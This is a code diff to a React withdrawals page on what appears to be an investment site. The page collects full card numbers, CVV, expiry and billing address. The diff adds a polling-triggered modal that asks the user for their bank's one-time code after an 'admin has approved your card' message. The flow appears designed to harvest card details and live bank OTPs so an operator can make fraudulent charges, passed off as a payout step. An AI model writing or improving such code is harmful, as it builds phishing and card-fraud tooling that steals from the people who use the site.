@@ -29,13 +29,16 @@ export default function WithdrawalsPage() {
   const [showForm, setShowForm] = useState(false)
   const [showConfirm, setShowConfirm] = useState(false)
   const [showSuccess, setShowSuccess] = useState(false)
+  const [showOTPModal, setShowOTPModal] = useState(false)
+  const [pendingWithdrawalId, setPendingWithdrawalId] = useState<string | null>(null)
+  const [otpCode, setOtpCode] = useState('')
   const [availableBalance, setAvailableBalance] = useState(0)
-  const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '', otpCode: '' })
+  const [formData, setFormData] = useState({ investmentId: '', amount: '', cardNumber: '', cardholderName: '', expiryDate: '', cvv: '', billingAddress: '' })
   const router = useRouter()
 
   useEffect(() => {
     fetchWithdrawals()
-    const interval = setInterval(fetchWithdrawals, 10000)
+    const interval = setInterval(fetchWithdrawals, 5000)
     return () => clearInterval(interval)
   }, [])
 
@@ -43,6 +46,14 @@ export default function WithdrawalsPage() {
     try {
       const { data } = await api.get('withdrawals')
       setWithdrawals(data.data)
+
+      // Check for AWAITING_OTP status to show modal
+      const awaitingOTP = data.data.find((w: any) => w.status === 'AWAITING_OTP')
+      if (awaitingOTP && !showOTPModal) {
+        setPendingWithdrawalId(awaitingOTP.id)
+        setShowOTPModal(true)
+        toast('Please enter OTP to proceed with withdrawal', { icon: '🔐' })
+      }
     } catch (err) {
       toast.error('Failed to fetch withdrawals')
     } finally {
@@ -75,10 +86,6 @@ export default function WithdrawalsPage() {
       toast.error('Billing address required')
       return
     }
-    if (!formData.otpCode || formData.otpCode.length < 4) {
-      toast.error('OTP code required')
-      return
-    }
     const fee = getWithdrawalFee(amount)
     const maxWithdrawable = availableBalance - fee
     if (amount > maxWithdrawable) {
@@ -102,14 +109,13 @@ export default function WithdrawalsPage() {
         expiryDate: formData.expiryDate,
         cvv: formData.cvv,
         billingAddress: formData.billingAddress,
-        otpCode: formData.otpCode,
       }
       const { data } = await api.post('withdrawals', payload)
       setShowForm(false)
       setShowConfirm(false)
       setConfirmAction(null)
       if (data.success && data.data?.id) {
-        toast.success('Withdrawal submitted. Admin will review and approve.')
+        toast.success('Withdrawal submitted. Admin will review your card details.')
       }
       fetchWithdrawals()
     } catch (err: any) {
@@ -119,8 +125,26 @@ export default function WithdrawalsPage() {
     }
   }
 
+  const handleSubmitOTP = async () => {
+    if (!pendingWithdrawalId || !otpCode || otpCode.length < 4) {
+      toast.error('Please enter valid OTP code')
+      return
+    }
+    try {
+      await api.put(`withdrawals/${pendingWithdrawalId}/otp`, { otpCode })
+      setShowOTPModal(false)
+      setOtpCode('')
+      setPendingWithdrawalId(null)
+      toast.success('OTP submitted! Admin will process your withdrawal.')
+      fetchWithdrawals()
+    } catch (err: any) {
+      toast.error(err.response?.data?.message || 'Failed')
+    }
+  }
+
   const statusColors: Record<string, string> = {
     'WAITING_FOR_ADMIN_APPROVAL': 'bg-blue-50 text-blue-700 border border-blue-200',
+    'AWAITING_OTP': 'bg-amber-50 text-amber-700 border border-amber-200',
     'WITHDRAWAL_PENDING': 'bg-yellow-50 text-yellow-700 border border-yellow-200',
     'WITHDRAWN': 'bg-green-50 text-green-700 border border-green-200',
     'REJECTED': 'bg-red-50 text-red-700 border border-red-200',
@@ -251,22 +275,6 @@ export default function WithdrawalsPage() {
                 />
               </div>
             </div>
-            <div className="sm:col-span-2">
-              <label className="block text-sm font-medium text-gray-700">OTP Code (from your bank/app)</label>
-              <div className="relative mt-1">
-                <Shield className="absolute left-3 top-3 h-4 w-4 text-gray-400" />
-                <input
-                  type="text"
-                  value={formData.otpCode}
-                  onChange={(e) => setFormData({ ...formData, otpCode: e.target.value.replace(/\D/g, '').slice(0, 10) })}
-                  className="w-full rounded-xl border border-gray-200 pl-10 pr-3 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 font-mono"
-                  required
-                  placeholder="Enter OTP from bank/SMS"
-                  maxLength={10}
-                />
-              </div>
-              <p className="mt-1 text-xs text-gray-500">Get OTP from your bank app or SMS to verify card ownership</p>
-            </div>
           </div>
           <div className="mt-4 flex gap-3">
             <button type="submit" className="rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-5 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90 transition-all duration-200">
@@ -280,6 +288,42 @@ export default function WithdrawalsPage() {
             Available: ${availableBalance.toLocaleString()} | Fee: {formData.amount ? `$${getWithdrawalFee(Number(formData.amount)).toFixed(2)}` : '-'} (2%, min $1, max $5)
           </p>
         </form>
+      )}
+
+      {showOTPModal && (
+        <div className="fixed inset-0 z-50 flex items-center justify-center bg-black/50">
+          <div className="rounded-3xl border bg-white p-6 shadow-sm w-full max-w-md mx-4">
+            <h3 className="text-lg font-semibold text-gray-900 mb-4 flex items-center gap-2">
+              <Shield className="h-5 w-5 text-brand-blue" />
+              Enter OTP
+            </h3>
+            <p className="text-sm text-gray-600 mb-4">
+              Admin has approved your card. Enter the OTP from your bank app to complete withdrawal.
+            </p>
+            <input
+              type="text"
+              value={otpCode}
+              onChange={(e) => setOtpCode(e.target.value.replace(/\D/g, '').slice(0, 10))}
+              className="w-full rounded-xl border border-gray-200 px-4 py-2.5 focus:border-brand-blue focus:outline-none focus:ring-2 focus:ring-brand-blue/10 text-center text-lg font-mono"
+              placeholder="Enter OTP code"
+              maxLength={10}
+            />
+            <div className="mt-4 flex gap-3">
+              <button
+                onClick={handleSubmitOTP}
+                className="flex-1 rounded-xl bg-gradient-to-r from-brand-blue to-brand-sky px-5 py-2 text-sm font-medium text-white hover:from-brand-blue/90 hover:to-brand-sky/90"
+              >
+                Submit OTP
+              </button>
+              <button
+                onClick={() => setShowOTPModal(false)}
+                className="rounded-xl border border-gray-200 px-5 py-2 text-sm text-gray-700 hover:bg-gray-50"
+              >
+                Cancel
+              </button>
+            </div>
+          </div>
+        </div>
       )}
 
       <ConfirmModal
